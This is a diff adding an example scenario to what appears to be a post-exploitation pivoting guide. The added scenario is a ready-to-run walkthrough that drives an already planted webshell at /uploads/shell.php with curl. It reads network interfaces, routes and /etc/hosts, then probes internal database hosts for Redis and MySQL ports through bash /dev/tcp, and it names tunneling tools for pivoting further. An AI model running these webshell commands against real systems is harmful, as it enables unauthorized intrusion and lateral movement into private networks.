@@ -25,6 +25,29 @@ Use this after a foothold. Build the network map first, then choose the lightest
 - `chisel` / `frp`: stable tunnel when direct webshell probing is insufficient.
 - `proxychains`: only after a SOCKS path is proven.
 
+## Example Scenario
+
+Webshell already exists at `/uploads/shell.php`.
+
+1. Read network state first:
+
+```bash
+curl -sG --data-urlencode 'cmd=ip -4 a' http://target/uploads/shell.php
+curl -sG --data-urlencode 'cmd=ip route' http://target/uploads/shell.php
+curl -sG --data-urlencode 'cmd=cat /etc/hosts' http://target/uploads/shell.php
+```
+
+2. `/etc/hosts` reveals `db` or `oa` aliases.
+3. Probe just those hosts with short checks, not the whole subnet.
+4. If direct webshell probing is clumsy, expose only one needed service with `suo5` or `Neo-reGeorg`.
+
+Example: if `/etc/hosts` shows `db`, test Redis and MariaDB before any larger pivot:
+
+```bash
+curl -sG --data-urlencode 'cmd=timeout 2 bash -lc "echo >/dev/tcp/db/6379 && echo redis-open"' http://target/uploads/shell.php
+curl -sG --data-urlencode 'cmd=timeout 2 bash -lc "echo >/dev/tcp/db/3306 && echo mysql-open"' http://target/uploads/shell.php
+```
+
 ## Guardrails
 
 - Avoid aggressive gateway probes that can hang or kill the target.
